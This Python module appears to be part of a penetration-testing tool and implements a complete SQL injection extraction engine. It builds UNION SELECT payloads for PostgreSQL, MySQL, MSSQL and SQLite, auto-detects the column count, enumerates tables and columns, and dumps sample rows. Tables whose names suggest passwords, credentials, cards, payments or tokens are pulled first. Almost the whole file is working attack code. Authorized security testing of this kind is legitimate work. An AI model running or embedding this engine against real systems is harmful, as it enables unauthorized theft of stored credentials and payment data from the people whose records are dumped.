"""
SQLi data extraction engine.

Standalone module — does NOT make HTTP requests directly. It receives
an `inject_fn` callback from the calling plugin and uses it to fire
UNION SELECT payloads and read back reflected values. This keeps the
extraction logic independently testable.

Usage from sqli.py:

    extractor = SQLiExtractor(
        inject_fn=my_inject_fn,   # async (payload: str) -> str
        db_type="postgresql",     # auto-detected by the calling plugin
        config=extraction_config, # dict from settings.plugins["sqli"]["extraction"]
    )
    result = await extractor.run()

Extraction is fully general-purpose:
  - No hardcoded table names or column counts.
  - Auto-enumerates UNION column count (1–15).
  - Extracts DB version, all table names, column names per table, and
    sample rows from tables whose names match high-value keywords.
  - Results land in Finding.evidence (human-readable) and
    Finding.extracted_data (structured JSON).

Opt-in: only runs when `extraction.enabled: true` AND
`engagement.allow_active_payloads: true`. Both must be set.
"""

from __future__ import annotations

import json
import re
from dataclasses import dataclass, field
from typing import Awaitable, Callable

from stelarstrike.utils.logger import get_logger

log = get_logger(__name__)

_HIGH_VALUE_KEYWORDS = [
    "user", "admin", "auth", "login", "credential", "password",
    "account", "card", "transaction", "payment", "merchant",
    "token", "session", "secret", "key", "api", "customer",
    "member", "profile", "setting", "config", "order",
]

# DB-specific SQL building blocks
_DB_BUILDERS: dict[str, dict[str, str]] = {
    "postgresql": {
        "version":        "version()",
        "table_names":    "string_agg(tablename,' ' ORDER BY tablename)",
        "table_schema":   "pg_tables",
        "schema_filter":  "schemaname='public'",
        "table_col":      "tablename",
        "col_agg":        "string_agg(column_name,' ' ORDER BY ordinal_position)",
        "col_table":      "information_schema.columns",
        "col_filter":     "table_name='{table}'",
        "row_sep":        "|||",
        "col_sep":        ":",
        "comment":        "-- -",
    },
    "mysql": {
        "version":        "version()",
        "table_names":    "group_concat(table_name ORDER BY table_name SEPARATOR ' ')",
        "table_schema":   "information_schema.tables",
        "schema_filter":  "table_schema=database()",
        "table_col":      "table_name",
        "col_agg":        "group_concat(column_name ORDER BY ordinal_position SEPARATOR ' ')",
        "col_table":      "information_schema.columns",
        "col_filter":     "table_name='{table}' AND table_schema=database()",
        "row_sep":        "|||",
        "col_sep":        ":",
        "comment":        "-- -",
    },
    "mssql": {
        "version":        "@@version",
        "table_names":    "string_agg(name,'|')",
        "table_schema":   "sysobjects",
        "schema_filter":  "xtype='U'",
        "table_col":      "name",
        "col_agg":        "string_agg(name,'|')",
        "col_table":      "sys.columns",
        "col_filter":     "object_id=OBJECT_ID('{table}')",
        "row_sep":        "|||",
        "col_sep":        ":",
        "comment":        "--",
    },
    "sqlite": {
        "version":        "sqlite_version()",
        "table_names":    "group_concat(name,' ')",
        "table_schema":   "sqlite_master",
        "schema_filter":  "type='table'",
        "table_col":      "name",
        "col_agg":        "group_concat(name,' ')",
        "col_table":      "pragma_table_info('{table}')",
        "col_filter":     "",
        "row_sep":        "|||",
        "col_sep":        ":",
        "comment":        "--",
    },
}


@dataclass
class ExtractionResult:
    db_version: str = ""
    db_type: str = ""
    tables: list[str] = field(default_factory=list)
    columns: dict[str, list[str]] = field(default_factory=dict)
    data: dict[str, list[dict]] = field(default_factory=dict)

    def to_dict(self) -> dict:
        return {
            "db_version": self.db_version,
            "db_type":    self.db_type,
            "tables":     self.tables,
            "columns":    self.columns,
            "data":       self.data,
        }

    def summary(self) -> str:
        lines = [
            f"Database: {self.db_type} {self.db_version}",
            f"Tables found ({len(self.tables)}): {', '.join(self.tables) or 'none'}",
        ]
        for table in self.tables:
            cols = self.columns.get(table, [])
            rows = self.data.get(table, [])
            lines.append(f"\n  [{table}] — {len(cols)} column(s), {len(rows)} row(s) sampled")
            if cols:
                lines.append(f"    Columns: {', '.join(cols)}")
            for row in rows[:5]:
                preview = {k: str(v)[:60] for k, v in row.items()}
                lines.append(f"    {preview}")
            if len(rows) > 5:
                lines.append(f"    ... and {len(rows) - 5} more row(s)")
        return "\n".join(lines)


class SQLiExtractor:
    def __init__(
        self,
        inject_fn: Callable[[str], Awaitable[str]],
        db_type: str,
        config: dict,
    ):
        self.inject = inject_fn
        self.db_type = db_type if db_type in _DB_BUILDERS else "postgresql"
        self.config = config
        self.db = _DB_BUILDERS[self.db_type]
        self.result = ExtractionResult(db_type=self.db_type)
        self._col_count: int | None = None  # cached once found

    async def run(self) -> ExtractionResult:
        """Run the full extraction pipeline and return the result."""
        extract_goals = self.config.get("extract", ["version", "schema"])

        if "version" in extract_goals:
            self.result.db_version = await self._get_version() or "unknown"

        if "schema" in extract_goals:
            self.result.tables = await self._get_tables()

        target_tables = self._rank_tables()
        max_tables = int(self.config.get("max_tables", 20))

        for table in target_tables[:max_tables]:
            cols = await self._get_columns(table)
            if cols:
                self.result.columns[table] = cols

        max_rows = int(self.config.get("max_rows_per_table", 50))
        for table in target_tables[:max_tables]:
            cols = self.result.columns.get(table, [])
            if not cols:
                continue
            rows = await self._get_table_data(table, cols, limit=max_rows)
            if rows:
                self.result.data[table] = rows

        return self.result

    # ---------------------------------------------------------------
    # Public single-step helpers (used by tests)
    # ---------------------------------------------------------------

    async def _get_version(self) -> str:
        return await self._union_scalar(self.db["version"])

    async def _get_tables(self) -> list[str]:
        d = self.db
        if self.db_type == "sqlite":
            subquery = f"(SELECT {d['table_names']} FROM {d['table_schema']} WHERE {d['schema_filter']})"
        else:
            subquery = f"(SELECT {d['table_names']} FROM {d['table_schema']} WHERE {d['schema_filter']})"
        raw = await self._union_scalar(subquery)
        if not raw:
            return []
        sep = "|" if self.db_type == "mssql" else " "
        return [t.strip() for t in raw.split(sep) if t.strip()]

    async def _get_columns(self, table: str) -> list[str]:
        d = self.db
        col_filter = d["col_filter"].format(table=table)

        if self.db_type == "sqlite":
            subquery = f"(SELECT {d['col_agg']} FROM {d['col_table'].format(table=table)})"
        elif col_filter:
            subquery = f"(SELECT {d['col_agg']} FROM {d['col_table']} WHERE {col_filter})"
        else:
            subquery = f"(SELECT {d['col_agg']} FROM {d['col_table']})"

        raw = await self._union_scalar(subquery)
        if not raw:
            return []
        sep = "|" if self.db_type == "mssql" else " "
        return [c.strip() for c in raw.split(sep) if c.strip()]

    async def _get_table_data(self, table: str, columns: list[str], limit: int = 50) -> list[dict]:
        if not columns:
            return []
        max_cols = int(self.config.get("max_columns_per_table", 30))
        cols = columns[:max_cols]

        if self.db_type == "postgresql":
            parts = [f"COALESCE({c}::text,'NULL')" for c in cols]
            concat = "||':'||".join(parts)
            subquery = (
                f"(SELECT string_agg({concat},'|||') "
                f"FROM (SELECT {','.join(cols)} FROM {table} LIMIT {limit}) sub)"
            )
        elif self.db_type == "mysql":
            parts = [f"COALESCE({c},'NULL')" for c in cols]
            concat = f"CONCAT_WS(':',{','.join(parts)})"
            subquery = (
                f"(SELECT GROUP_CONCAT({concat} SEPARATOR '|||') "
                f"FROM (SELECT {','.join(cols)} FROM {table} LIMIT {limit}) sub)"
            )
        else:
            return []  # MSSQL/SQLite row extraction is complex — schema is sufficient proof

        raw = await self._union_scalar(subquery)
        if not raw:
            return []

        rows = []
        for row_str in raw.split("|||"):
            values = row_str.split(":")
            row = {col: (None if values[i] == "NULL" else values[i]) if i < len(values) else None
                   for i, col in enumerate(cols)}
            rows.append(row)
        return rows

    # ---------------------------------------------------------------
    # Core UNION injection
    # ---------------------------------------------------------------

    # Sentinel markers — unique enough to not appear naturally in responses,
    # short enough to not get truncated by VARCHAR columns.
    _SENTINEL_START = "STELR0"
    _SENTINEL_END   = "0RLETS"

    def _wrap_sentinel(self, subquery: str) -> str:
        """Wrap subquery output in sentinel markers using DB-appropriate concat."""
        s, e = self._SENTINEL_START, self._SENTINEL_END
        if self.db_type in ("postgresql", "sqlite"):
            return f"'{s}'||({subquery})||'{e}'"
        if self.db_type == "mysql":
            return f"CONCAT('{s}',({subquery}),'{e}')"
        if self.db_type == "mssql":
            return f"'{s}'+CAST(({subquery}) AS NVARCHAR(MAX))+'{e}'"
        # fallback — pipe concat works on most DBs
        return f"'{s}'||({subquery})||'{e}'"

    async def _union_scalar(self, subquery: str) -> str:
        """
        Inject a UNION SELECT and return the reflected value.

        Strategy (in order per column count):
          1. Try NULL-padded UNION with sentinel-wrapped subquery (string context).
          2. If column-count mismatch → increment and retry.
          3. If "works" but no sentinel in response → try numeric context prefix.
          4. Cache the working column count on first success.
        """
        comment = self.db["comment"]
        wrapped = self._wrap_sentinel(subquery)

        col_range = [self._col_count] if self._col_count else range(1, 16)

        for col_count in col_range:
            compat = self._compat_cols(col_count - 1)
            parts = [wrapped] + ([compat] if compat else [])
            cols_str = ",".join(parts)

            # Context 1: string context  (' UNION SELECT ...)
            for prefix in (f"' UNION SELECT {cols_str}{comment}",
                           f" UNION SELECT {cols_str}{comment}",
                           f"') UNION SELECT {cols_str}{comment}"):
                try:
                    log.debug(f"sqli-extract: UNION probe col_count={col_count} prefix={prefix[:40]!r}")
                    response = await self.inject(prefix)
                except Exception as exc:  # noqa: BLE001
                    log.debug(f"sqli-extract: inject failed: {exc}")
                    continue

                lower = response.lower()

                # Column count mismatch — try next count
                if any(s in lower for s in (
                    "same number of columns",
                    "each union query must have",
                    "different number of columns",
                    "number of columns",
                )):
                    log.debug(f"sqli-extract: col_count={col_count} mismatch with prefix {prefix[:30]!r}")
                    break  # try next col_count, not next prefix

                value = self._extract_value(response)
                if value:
                    log.debug(f"sqli-extract: ✓ got value (col_count={col_count}): {value[:60]!r}")
                    if not self._col_count:
                        self._col_count = col_count
                    return value

                log.debug(f"sqli-extract: sentinel not found in response ({len(response)} bytes)")

        log.debug("sqli-extract: _union_scalar exhausted all column counts — no value extracted")
        return ""

    def _compat_cols(self, count: int) -> str:
        """NULL is type-agnostic and works across all SQL dialects for padding."""
        if count <= 0:
            return ""
        return ",".join(["NULL"] * count)

    def _extract_value(self, response_body: str) -> str:
        """
        Extract the injected value from the response.

        Primary method: sentinel search (reliable regardless of HTML structure).
        Fallback 1: JSON longest-string (for JSON APIs).
        Fallback 2: regex (last resort, returns empty if ambiguous).
        """
        s, e = self._SENTINEL_START, self._SENTINEL_END

        # Primary: sentinel markers
        idx_start = response_body.find(s)
        if idx_start != -1:
            idx_end = response_body.find(e, idx_start + len(s))
            if idx_end != -1:
                extracted = response_body[idx_start + len(s):idx_end].strip()
                if extracted:
                    return extracted

        # Fallback 1: JSON response
        try:
            data = json.loads(response_body)
            val = self._longest_json_string(data)
            if val and len(val) > 5 and not self._looks_like_error(val):
                return val
        except (json.JSONDecodeError, TypeError, ValueError):
            pass

        # Fallback 2: regex (very conservative — only return if unambiguous)
        matches = re.findall(
            r'(?<!["\w/])([A-Za-z0-9_.@\-]{8,}\s[A-Za-z0-9_.@\-\s]{4,})(?!["\w/])',
            response_body,
        )
        # Only use regex result if exactly one long match (avoids grabbing nav/CSS)
        unique = [m.strip() for m in matches if len(m.strip()) > 10 and not self._looks_like_error(m)]
        if len(unique) == 1:
            return unique[0]

        return ""


    def _longest_json_string(self, obj) -> str:
        best = ""

        def walk(o):
            nonlocal best
            if isinstance(o, str):
                if len(o) > len(best):
                    best = o
            elif isinstance(o, dict):
                for v in o.values():
                    walk(v)
            elif isinstance(o, list):
                for item in o:
                    walk(item)

        walk(obj)
        return best

    @staticmethod
    def _looks_like_error(value: str) -> bool:
        indicators = ["error", "syntax", "exception", "traceback", "failed", "invalid"]
        lower = value.lower()
        return any(ind in lower for ind in indicators)

    def _rank_tables(self) -> list[str]:
        """Sort discovered tables by high-value keyword score, descending."""
        scored = []
        for table in self.result.tables:
            score = sum(1 for kw in _HIGH_VALUE_KEYWORDS if kw in table.lower())
            scored.append((score, table))
        scored.sort(reverse=True)
        return [t for _, t in scored]
